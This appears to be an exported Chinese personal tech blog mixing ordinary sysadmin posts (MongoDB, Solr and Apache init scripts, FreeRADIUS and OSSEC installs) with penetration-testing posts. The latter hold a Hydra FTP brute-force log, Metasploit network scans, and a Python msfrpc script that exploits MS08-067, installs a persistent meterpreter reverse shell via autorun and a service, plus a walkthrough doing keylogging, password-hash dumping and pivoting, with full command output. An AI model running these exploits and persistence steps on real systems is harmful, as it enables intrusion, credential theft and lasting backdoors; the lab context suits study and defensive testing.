(http://www.thc.org/thc-hydra) starting at 2016-06-02 12:41:32[DATA] max 16 tasks per 1 server, overall 64 tasks, 22425 login tries (l:69/p:325), ~21 tries per task[DATA] attacking service ftp on port 21[21][ftp] host: 192.168.1.55 login: ftp password: ftp1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2016-06-02 12:41:37[&#123;&quot;status&quot;: &quot;success&quot;, &quot;login&quot;: &quot;ftp&quot;, &quot;password&quot;: &quot;ftp&quot;&#125;] 备选方案 全能暴力破解测试工具——Patator v0.5https://github.com/lanjelot/patator","tags":[{"name":"hydra","slug":"hydra","permalink":"http://yoursite.com/tags/hydra/"}]},{"title":"MongoDB 开机自启动","date":"2016-09-20T08:18:41.000Z","path":"db/MongoDB-开机自启动/","text":"mongodb1vim /etc/rc.d/init.d/mongodb 如果需要后台的方式启动，则为/dat0/mongodb/bin/mongod –dbpath=/data/db/ –fork –logpath=/data/logs/mongodb.log 123456789101112131415161718192021222324252627#!/bin/sh # #chkconfig: 2345 80 90 #description: mongodb start() &#123; /dat0/mongodb/bin/mongod&#125; stop() &#123; /dat0/mongodb/bin/mongod --shutdown &#125; case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) echo $\"Usage: $0 &#123;start|stop|restart&#125;\" exit 1 esac 123chkconfig --add mongodb chmod +x mongodb chkconfig mongodb on 其他 相同道理的还有，solr和Apache等自启动 123456789101112131415161718192021222324252627282930#!/bin/sh##chkconfig: 2345 80 90#description: solrstart() &#123;/dat0/solr/bin/solr start -cloud -s /dat0/solr/server/cloud/node1/solr/dat0/solr/bin/solr start -cloud -s /dat0/solr/server/cloud/node2/solr -p 7574 -z localhost:9983/dat0/solr/bin/solr start -cloud -s /dat0/solr/server/cloud/node3/solr -p 8984 -z localhost:9983&#125;stop() &#123;/dat0/solr/bin/solr stop -all&#125;case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) echo $\"Usage: $0 &#123;start|stop|restart&#125;\" exit 1esac 123456789101112131415161718192021222324252627!/bin/sh##chkconfig: 2345 80 90#description: apachestart() &#123;/usr/local/apache2/bin/httpd&#125;stop() &#123;killall httpd&#125;case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) echo $\"Usage: $0 &#123;start|stop|restart&#125;\" exit 1esac","tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"FreeRADIUS","date":"2016-09-18T12:30:23.000Z","path":"devops/FreeRADIUS/","text":"Radius Remote Authentication Dial In User Service 远程访问拨号用户服务1RADIUS是一种C/S结构的协议，它的客户端最初就是NAS（Net Access Server）服务器，任何运行RADIUS客户端软件的计算机都可以成为RADIUS的客户端。RADIUS协议认证机制灵活，可以采用PAP、CHAP或者Unix登录认证等多种方式。RADIUS是一种可扩展的协议，它进行的全部工作都是基于Attribute-Length-Value的向量进行的。RADIUS也支持厂商扩充厂家专有属性。 Freeradius Install Ubuntu. 1wget ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-3.0.11.tar.gz 1tar zxf freeradius-server-3.0.11.tar.gz 1cd freeradius-server-3.0.11/ 1./configure Bug Fix在configure时可能会出现failed linking to libcrypto. Use –with-openssl-lib-dir=, or –with-openssl=no (builds without OpenSSL)解决办法123Red Hat, Fedora, CentOS - openssl-develDebian, Ubuntu - libssl-devArch - openssl error: FreeRADIUS requires libtalloc 1yum install libtalloc-devel -y 1sudo make &amp;&amp; make install 运行1radiusd -X 测试1adtest hello hello localhost 0 testing123 To Do 修改的模块是modules里面的rlm_realm，这个module完成了Proxy的相关业务逻辑，我们需要开发HUE的rlm_realm，并打包。1./src/modules/rlm_realm/rlm_realm.c PAM Pluggable Authentication Modules 可插拔认证模块http://www.ibm.com/developerworks/cn/linux/l-pam/ PAM的文件123/etc/pam.conf或者/etc/pam.d/ PAM配置文件/usr/lib/security/pam_*.so 可动态加载的PAM service module对于RedHat，其目录不是/usr/lib，而是/lib","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"FreeRADIUS","slug":"FreeRADIUS","permalink":"http://yoursite.com/tags/FreeRADIUS/"}]},{"title":"Centos 6.6 Install OSSEC","date":"2016-08-27T12:22:02.000Z","path":"sec/Centos-6-6-Install-OSSEC/","text":"前言 OSSEC是一款开源的基于主机的入侵检测系统，可以简称为HIDS。它具备日志分析，文件完整性检查，策略监控，rootkit检测，实时报警以及联动响应等功能。它支持多种操作系统：Linux、Windows、MacOS、Solaris、HP-UX、AIX。属于企业安全之利器。 环境CentOS 6.6 安装关联库和软件首先我们安装需要用到的关联库和软件，由于我们最终是需要把日志导入到MySQL中进行分析，以及需要通过web程序对报警结果进行展示，同时需要把本机当做SMTP，所以需要在本机安装MySQL、Apache和sendmail服务。在当前的终端中执行如下命令：1yum install wget gcc make mysql mysql-server mysql-devel httpd php php-mysql sendmail 启动服务123[root@ossec-server ~]# /etc/init.d/httpd start[root@ossec-server ~]# /etc/init.d/mysqld start[root@ossec-server ~]# /etc/init.d/sendmail start Mysql相关配置123456[root@ossec-server ~]# mysql -uroot -pmysql&gt; create database ossec;mysql&gt; grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@localhost;mysql&gt; set password for ossec@localhost=PASSWORD(&apos;ossec&apos;);mysql&gt; flush privileges;mysql&gt; exit 安装OSSEC服务端 首先通过官网的链接下载当前的最新稳定版本 2.8.3 的服务端包，同时解压。 123456789wget https://akamai.bintray.com/87/87c7a1904d5c08c7cff3e42bd47c055b14b08faa?__gda__=exp=1465265745~hmac=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed&amp;response-content-disposition=attachment%3Bfilename%3D%22ossec-hids-2.8.3.tar.gz%22&amp;response-content-type=application%2Fgzip重命名文件mv 87c7a1904d5c08c7cff3e42bd47c055b14b08faa\\?__gda__\\=exp\\=1465265745~hmac\\=3dacb2ddfc1c2aff8eeeff60f6c1ec8cbebf3dab98370b6894f3d87399be85ed ossec.tar.gz解压[root@CentOS-6 ~]# tar -zxf ossec.tar.gz[root@CentOS-6 ~]# ls– ossec-hids-2.8.3anaconda-ks.cfg ossec.tar.gz 为了使OSSEC支持MySQL，需要在安装前执行make setdb命令，如下 123456789101112[root@CentOS-6 ossec-hids-2.8.3]# cd src[root@CentOS-6 src]# lsaddagent error_messages LOCATION os_crypto os_regex syscheckdagentlessd external logcollector os_csyslogd os_xml testsanalysisd headers Makeall os_dbd os_zlib utilclient-agent init Makefile os_execd remoted VERSIONconfig InstallAgent.sh monitord os_maild rootcheck win32Config.Make InstallServer.sh os_auth os_net shared[root@CentOS-6 src]# make setdbInfo: Compiled with MySQL support.Info: Compiled with PostgreSQL support.[root@CentOS-6 src]# cd .. 执行安装脚本 1234567891011121314151617181920[root@CentOS-6 ossec-hids-2.8.3]# ./install.shwhich: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin) ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l&apos;installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. ** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cnwhich: no host in (/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin) 安装完成标识 12345678感谢使用 OSSEC HIDS. 如果您有任何疑问,建议或您找到任何bug, 请通过 contact@ossec.net 或邮件列表 ossec-list@ossec.net 联系我们.( http://www.ossec.net/en/mailing_lists.html ).您可以在 http://www.ossec.net 获得更多信息--- 请按 ENTER 结束安装 (下面可能有更多信息). ---直到碰到上面内容，说明安装完成。 配置服务端，使其工作正常 执行下面命令启用数据库支持1[root@CentOS-6 bin]# /var/ossec/bin/ossec-control enable database 导入MySQL表结构到MySQL中1[root@CentOS-6 bin]# mysql -uossec -p ossec &lt; ~/ossec-hids-2.8.3/src/os_dbd/mysql.schema 修改部分配置文件的权限，否则会启动服务失败：1[root@CentOS-6 etc]# chmod u+w /var/ossec/etc/ossec.conf 启动服务 12[root@CentOS-6 /]# /etc/init.d/ossec-hids startStarting ossec-hids: [确定]","tags":[{"name":"OSSEC","slug":"OSSEC","permalink":"http://yoursite.com/tags/OSSEC/"}]},{"title":"通过msf获取指定主机端口、服务、和版本信息","date":"2016-08-20T12:12:11.000Z","path":"sec/通过msf获取指定主机端口、服务、和版本信息/","text":"探测主机信息1db_nmap -sS -A -PO 192.168.1.43 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[*] Nmap: Starting Nmap 7.01 ( https://nmap.org ) at 2016-06-04 09:08 HKT[*] Nmap: Nmap scan report for dh-ca8822ab9589 (192.168.1.43)[*] Nmap: Host is up (0.00021s latency).[*] Nmap: Not shown: 987 closed ports[*] Nmap: PORT STATE SERVICE VERSION[*] Nmap: 21/tcp open ftp FileZilla ftpd 0.9.41 beta[*] Nmap: 25/tcp open smtp Microsoft ESMTP 6.0.2600.5512[*] Nmap: | smtp-commands: dh-ca8822ab9589 Hello [192.168.1.8], SIZE 2097152, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK,[*] Nmap: |_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH BDAT VRFY[*] Nmap: 80/tcp open http Microsoft IIS httpd 5.1[*] Nmap: | http-methods:[*] Nmap: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH[*] Nmap: |_http-server-header: Microsoft-IIS/5.1[*] Nmap: |_http-title: \\xD5\\xFD\\xD4\\xDA\\xBD\\xA8\\xC9\\xE8\\xD6\\xD0[*] Nmap: | http-webdav-scan:[*] Nmap: | Server Date: Fri, 03 Jun 2016 01:11:01 GMT[*] Nmap: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK[*] Nmap: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH[*] Nmap: | Server Type: Microsoft-IIS/5.1[*] Nmap: |_ WebDAV type: Unkown[*] Nmap: 135/tcp open msrpc Microsoft Windows RPC[*] Nmap: 139/tcp open netbios-ssn Microsoft Windows 98 netbios-ssn[*] Nmap: 443/tcp open https?[*] Nmap: 445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds[*] Nmap: 777/tcp open multiling-http?[*] Nmap: 1025/tcp open msrpc Microsoft Windows RPC[*] Nmap: 3389/tcp open ms-wbt-server Microsoft Terminal Service[*] Nmap: 6002/tcp open http SafeNet Sentinel Protection Server httpd 7.3[*] Nmap: |_http-server-header: SentinelProtectionServer/7.3[*] Nmap: |_http-title: Sentinel License Monitor[*] Nmap: 7001/tcp open afs3-callback?[*] Nmap: 7002/tcp open http SafeNet Sentinel Keys License Monitor httpd 1.0 (Java Console)[*] Nmap: |_http-title: Sentinel Keys License Monitor[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :[*] Nmap: SF-Port777-TCP:V=7.01%I=7%D=6/4%Time=57522A42%P=x86_64-pc-linux-gnu%r(Kerb[*] Nmap: SF:eros,5,\"\\x01\\0\\t\\xe0\\x06\")%r(SMBProgNeg,5,\"\\x01\\0\\t\\xe0\\x06\")%r(Termina[*] Nmap: SF:lServer,A,\"\\x01\\0\\t\\xe0\\x06\\x01\\0\\t\\xe0\\x06\")%r(WMSRequest,5,\"\\x01\\0\\t\\[*] Nmap: SF:xe0\\x06\");[*] Nmap: MAC Address: 00:0C:29:84:07:87 (VMware)[*] Nmap: Device type: general purpose[*] Nmap: Running: Microsoft Windows XP[*] Nmap: OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3[*] Nmap: OS details: Microsoft Windows XP SP2 or SP3[*] Nmap: Network Distance: 1 hop[*] Nmap: Service Info: OSs: Windows, Windows 98, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_98, cpe:/o:microsoft:windows_xp[*] Nmap: Host script results:[*] Nmap: |_nbstat: NetBIOS name: DH-CA8822AB9589, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:84:07:87 (VMware)[*] Nmap: | smb-os-discovery:[*] Nmap: | OS: Windows XP (Windows 2000 LAN Manager)[*] Nmap: | OS CPE: cpe:/o:microsoft:windows_xp::-[*] Nmap: | Computer name: dh-ca8822ab9589[*] Nmap: | NetBIOS computer name: DH-CA8822AB9589[*] Nmap: | Workgroup: WORKGROUP[*] Nmap: |_ System time: 2016-06-03T09:11:02+08:00[*] Nmap: | smb-security-mode:[*] Nmap: | account_used: guest[*] Nmap: | authentication_level: user[*] Nmap: | challenge_response: supported[*] Nmap: |_ message_signing: disabled (dangerous, but default)[*] Nmap: |_smbv2-enabled: Server doesnt support SMBv2 protocol[*] Nmap: TRACEROUTE[*] Nmap: HOP RTT ADDRESS[*] Nmap: 1 0.21 ms dh-ca8822ab9589 (192.168.1.43)[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 172.64 secondsmsf &gt; 提取相应信息1services -c port,name,info 192.168.1.43 1234567891011121314151617181920Services========host port name info---- ---- ---- ----192.168.1.43 21 ftp FileZilla ftpd 0.9.41 beta192.168.1.43 25 smtp 220 dh-ca8822ab9589 Microsoft ESMTP MAIL Service, Version: 6.0.2600.5512 ready at Fri, 3 Jun 2016 09:25:13 +0800192.168.1.43 80 http Microsoft IIS httpd 5.1192.168.1.43 135 msrpc Microsoft Windows RPC192.168.1.43 139 netbios-ssn Microsoft Windows 98 netbios-ssn192.168.1.43 443 https 192.168.1.43 445 microsoft-ds Microsoft Windows XP microsoft-ds192.168.1.43 777 multiling-http 192.168.1.43 1025 msrpc Microsoft Windows RPC192.168.1.43 3389 ms-wbt-server Microsoft Terminal Service192.168.1.43 6002 http SafeNet Sentinel Protection Server httpd 7.3192.168.1.43 7001 afs3-callback 192.168.1.43 7002 http SafeNet Sentinel Keys License Monitor httpd 1.0 Java Console 对网段主机进行系统识别扫描1msf &gt; use auxiliary/scanner/smb/smb_version 12msf auxiliary(smb_version) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24 12msf auxiliary(smb_version) &gt; set THREADS 30THREADS =&gt; 30 12345678910111213141516171819202122msf auxiliary(smb_version) &gt; run[*] 192.168.1.27:445 is running Windows 7 Enterprise SP1 (build:7601) (name:JSEPC10048) (domain:WORKGROUP)[*] 192.168.1.34:445 is running Windows 7 Ultimate SP1 (build:7601) (name:FLAG-PC) (domain:WORKGROUP)[*] 192.168.1.31:445 is running Windows 10 Pro (build:10586) (name:DESKTOP-DP2RPVA) (domain:WORKGROUP)[*] 192.168.1.13:445 is running Windows 7 Ultimate SP1 (build:7601) (name:PAYEGIS-PC) (domain:WORKGROUP)[*] 192.168.1.42:445 could not be identified: ()[*] Scanned 43 of 256 hosts (16% complete)[*] 192.168.1.66:445 is running Windows 2008 R2 Enterprise SP1 (build:7601) (name:HENG-VMWARE) (domain:WORKGROUP)[*] 192.168.1.77:445 is running Windows 2008 R2 Standard SP1 (build:7601) (name:HENGWORK-2008) (domain:WORKGROUP)[*] Scanned 77 of 256 hosts (30% complete)[*] Scanned 80 of 256 hosts (31% complete)[*] 192.168.1.88:445 is running Windows 7 Ultimate SP1 (build:7601) (name:HENG-PC) (domain:WORKGROUP)[*] Scanned 105 of 256 hosts (41% complete)[*] Scanned 135 of 256 hosts (52% complete)[*] Scanned 158 of 256 hosts (61% complete)[*] 192.168.1.173:445 is running Windows 2008 R2 Standard SP1 (build:7601) (name:WIN-O41L6VFBLUS) (domain:WORKGROUP)[*] Scanned 194 of 256 hosts (75% complete)[*] Scanned 219 of 256 hosts (85% complete)[*] Scanned 232 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed","tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"[Demo] MSF检测指定服务的漏洞","date":"2016-08-11T15:00:13.000Z","path":"sec/Demo-MSF检测指定服务的漏洞/","text":"#相关资源 SpiderLabs/msfrpc Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118# -*- coding: utf-8 -*-'''用MSF检测指定服务的漏洞本脚本以 MS08-067为例'''__author__ = \"SanNa\"import osimport msfrpcimport optparseimport sysfrom time import sleepLOGIN = 'msf'PASSWD = 'abc123'def builder(RHOST, LHOST, LPORT): '''根据相关信息创建文件 :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 ''' postcomms = \"\"\"getsystem run persistence -S -U -X -i 10 -p 80 -r \"\"\"+LHOST+\"\"\" cd c:\\\\ upload /tmp/ms08067_patch.exe c:\\\\ upload /tmp/ms08067_install.bat c:\\\\ execute -f ms08067_install.bat \"\"\" batcomm = \"ms08067_patch.exe /quiet\" with open ('/tmp/smbpost.rc', 'w') as post, open('/tmp/ms08067_install.bat', 'w') as bat: post.write(postcomms) bat.write(batcomm)def sploiter(RHOST, LHOST, LPORT, session): '''连接到msfconsole :param RHOST: 目标ip :param LHOST: 监听IP :param LPORT: 监听端口 :param session: session ''' client = msfrpc.Msfrpc(&#123;&#125;) client.login(LOGIN, PASSWD) ress = client.call('console.create') console_id = ress['id'] # Exploit MS08-067 commands = \"\"\"use exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/meterpreter/reverse_tcp set RHOST \"\"\"+RHOST+\"\"\" set LHOST \"\"\"+LHOST+\"\"\" set LPORT \"\"\"+LPORT+\"\"\" set ExitOnSession false exploit -z \"\"\" print \"[+] Exploiting MS08-067 on: \" + RHOST client.call('console.write',[console_id,commands]) res = client.call('console.read',[console_id]) result = res['data'].split('\\n') # 运行攻击脚本 runPost = \"\"\"use post/multi/gather/run_console_rc_file set RESOURCE /tmp/smbpost.rc set SESSION \"\"\"+session+\"\"\" exploit \"\"\" print \"[+] Running post-exploit script on: \" + RHOST client.call('console.write',[console_id,runPost]) rres = client.call('console.read',[console_id]) #Setup Listener for presistent connection back over port 80 sleep(10) listen = \"\"\"use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LPORT 80 set LHOST \"\"\"+LHOST+\"\"\" exploit \"\"\" print \"[+] Setting up listener on: \" + LHOST + \":80\" client.call('console.write',[console_id,listen]) lres = client.call('console.read',[console_id]) print lresdef main(): parser = optparse.OptionParser(sys.argv[0] +\\ ' -p LPORT -r RHOST -l LHOST -s session') parser.add_option('-p', dest='LPORT', type='string', \\ help ='specify a port to listen on') parser.add_option('-r', dest='RHOST', type='string', \\ help='Specify a remote host') parser.add_option('-l', dest='LHOST', type='string', \\ help='Specify a local host') parser.add_option('-s', dest='session', type='string', \\ help ='specify session ID') (options, args) = parser.parse_args() session=options.session RHOST=options.RHOST; LHOST=options.LHOST; LPORT=options.LPORT if (RHOST == None) and (LPORT == None) and (LHOST == None): print parser.usage sys.exit(0) builder(RHOST, LHOST, LPORT) sploiter(RHOST, LHOST, LPORT, session)if __name__ == \"__main__\": main() 执行方式12345➜ ~ python 333msf.py -p 4444 -r 192.168.1.43 -l 192.168.1.8 -s 8[+] Exploiting MS08-067 on: 192.168.1.43[+] Running post-exploit script on: 192.168.1.43[+] Setting up listener on: 192.168.1.8:80[&#123;\"prompt\": \"\\u0001\\u0002msf\\u0001\\u0002 post(\\u0001\\u0002\\u0001\\u0002run_console_rc_file\\u0001\\u0002) \\u0001\\u0002&gt; \", \"busy\": true, \"data\": \"PAYLOAD =&gt; windows/meterpreter/reverse_tcp\\nRHOST =&gt; 192.168.1.43\\nLHOST =&gt; 192.168.1.8\\nLPORT =&gt; 4444\\nExitOnSession =&gt; false\\n[*] Started reverse TCP handler on 192.168.1.8:4444 \\n[*] Automatically detecting the target...\\n[*] Fingerprint: Windows XP - Service Pack 3 - lang:English\\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\\n[*] Attempting to trigger the vulnerability...\\n[*] Sending stage (957487 bytes) to 192.168.1.43\\n[*] Meterpreter session 8 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1139) at 2016-06-03 21:13:38 +0800\\n[*] Session 8 created in the background.\\nRESOURCE =&gt; /tmp/smbpost.rc\\nSESSION =&gt; 7\\n[*] Running module against DH-CA8822AB9589\\n[*] Running command getsystem\\n[*] Running command run persistence -S -U -X -i 10 -p 80 -r 192.168.1.8\\n\"&#125;] 执行脚本时msf端命令行回显123456789101112[*] Running Persistance Script[*] Resource file for cleanup created at /root/.msf7/logs/persistence/DH-CA8822AB9589_20160603.2703/DH-CA8822AB9589_20160603.2703.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=80[*] Persistent agent script is 148419 bytes long[+] Persistent Script written to C:\\WINDOWS\\TEMP\\IezQttslf.vbs[*] Executing script C:\\WINDOWS\\TEMP\\IezQttslf.vbs[+] Agent executed with PID 2720[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DIwbwLlJMJ[*] Installing as service..[*] Creating service YsimPwZAk[*] Meterpreter session 3 opened (192.168.1.8:80 -&gt; 192.168.1.43:1083) at 2016-06-03 18:27:06 +0800 session12345678910111213msf &gt; sessionsActive sessions=============== Id Type Information Connection -- ---- ----------- ---------- 7 meterpreter x86/win32 DH-CA8822AB9589\\Administrator @ DH-CA8822AB9589 192.168.1.8:80 -&gt; 192.168.1.43:1138 (192.168.1.43) 8 meterpreter x86/win32 NT AUTHORITY\\SYSTEM @ DH-CA8822AB9589 192.168.1.8:4444 -&gt; 192.168.1.43:1139 (192.168.1.43)msf &gt; sessions -i 8[*] Starting interaction with 6... 相关操作12345678910111213141516171819202122232425262728meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32meterpreter &gt; shellProcess 3492 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\Documents and Settings\\Administrator&gt;","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Test-MS08-067","date":"2016-08-10T13:44:42.000Z","path":"sec/Test-MS08-067/","text":"环境1234Kali2.0192.168.1.8WinXPenSP3192.168.1.43 Start123msf auxiliary(syn) &gt; use exploit/windows/smb/ms08_067_netapimsf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcp Show Option12345678910111213141516171819202122232425msf exploit(ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Automatic Targeting Set Option1234msf exploit(ms08_067_netapi) &gt; set RhOST 192.168.1.43RhOST =&gt; 192.168.1.43msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.1.8LHOST =&gt; 192.168.1.8 Exploit123456789101112131415161718msf exploit(ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 192.168.1.8:4444[*] Automatically detecting the target...[*] Fingerprint: Windows XP - Service Pack 3 - lang:English[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] Attempting to trigger the vulnerability...[*] Sending stage (957487 bytes) to 192.168.1.43[*] Meterpreter session 1 opened (192.168.1.8:4444 -&gt; 192.168.1.43:1115) at 2016-06-03 14:18:57 +0800meterpreter &gt; lsListing: C:\\WINDOWS\\system32============================Mode Size Type Last modified Name---- ---- ---- ------------- ----100666/rw-rw-rw- 1482 fil 2011-08-14 13:40:01 +0800 $winnt$.inf40777/rwxrwxrwx 0 dir 2011-08-14 21:19:31 +0800 1025 Shell1234567891011121314151617181920meterpreter &gt; shellProcess 1004 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : IP Address. . . . . . . . . . . . : 192.168.1.43 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.1.1C:\\WINDOWS\\system32&gt; 常用手法截屏12meterpreter &gt; screenshotScreenshot saved to: /root/Fyjiynwg.jpeg 获取系统信息12345678meterpreter &gt; sysinfoComputer : DH-CA8822AB9589OS : Windows XP (Build 2600, Service Pack 3).Architecture : x86System Language : en_USDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/win32 目标系统正在运行的进程1234567891011meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 NT AUTHORITY\\SYSTEM 128 676 VMUpgradeHelper.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMUpgradeHelper.exe 560 4 smss.exe x86 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 键盘记录 使用migrate将会话迁移至explorer.exe(pid)进程中再启动keylog_recorder模块，需要终止时CTRL+C 123456789101112meterpreter &gt; migrate 1652[*] Migrating from 1032 to 1652...[*] Migration completed successfully.meterpreter &gt; run post/windows/capture/keylog_recorder[*] Executing module against DH-CA8822AB9589[*] Starting the keystroke sniffer...[*] Keystrokes being saved in to /root/.msf7/loot/20160603143131_default_192.168.1.43_host.windows.key_581630.txt[*] Recording keystrokes...^C[*] Saving last few keystrokes...[*] Interrupt[*] Stopping keystroke sniffer... 获取密码哈希值12345678meterpreter &gt; hashdumpAdministrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::HelpAssistant:1000:32f842845a64f17ccbe6b10315169b7e:83789c0d8506a618d815fd9c6fb379e1:::IUSR_DH-CA8822AB9589:1003:de8b8cec054052bb8ab2d451a3e61856:145f992fa5ff125301520f8e27419c6d:::IWAM_DH-CA8822AB9589:1004:90b05d38a1fc8d80a4ae31c7bc961352:2f950167d2942f7c977fdfd1857b8a59:::SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bb5a5a239a6e521be591fdf091b05013:::meterprete 将目标机器作为跳板1234567891011121314meterpreter &gt; run get_local_subnetsLocal subnet: 192.168.1.0/255.255.255.0meterpreter &gt; background[*] Backgrounding session 1...msf exploit(ms08_067_netapi) &gt; route add 192.168.3.0 255.255.255.0 1[*] Route addedmsf exploit(ms08_067_netapi) &gt; route printActive Routing Table==================== Subnet Netmask Gateway ------ ------- ------- 192.168.3.0 255.255.255.0 Session 1","tags":[{"name":"安全","slug":"安全","permalink":"http://yoursite.com/tags/安全/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://yoursite.com/tags/Metasploit/"}]},{"title":"Metasploit-MIDI文件解析远程代码执行","date":"2016-08-09T14:40:46.000Z","path":"sec/Metasploit-MIDI文件解析远程代码执行/","text":"启动msf1234567[*] Processing setup.rc for ERB directives.resource (setup.rc)&gt; db_connect msf:msf123@127.0.0.1/msfresource (setup.rc)&gt; load msgrpc User=msf Pass='abc123'[*] MSGRPC Service: 127.0.0.1:55552[*] MSGRPC Username: msf[*] MSGRPC Password: abc123[*] Successfully loaded plugin: msgrpc 搜索和使用漏洞模块123456789101112msf &gt; search 12-004[!] Module database cache not built yet, using slow searchMatching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- exploit/windows/browser/ms12_004_midi 2012-01-10 normal MS12-004 midiOutPlayNextPolyEvent Heap Overflowmsf &gt; use exploit/windows/browser/ms12_004_midi 显示和设置相关Option123456789101112131415161718192021222324252627282930313233msf exploit(ms12_004_midi) &gt; show optionsModule options (exploit/windows/browser/ms12_004_midi): Name Current Setting Required Description ---- --------------- -------- ----------- OBFUSCATE false no Enable JavaScript obfuscation SRVHOST 0.0.0.0 yes The local host to listen on. This must be 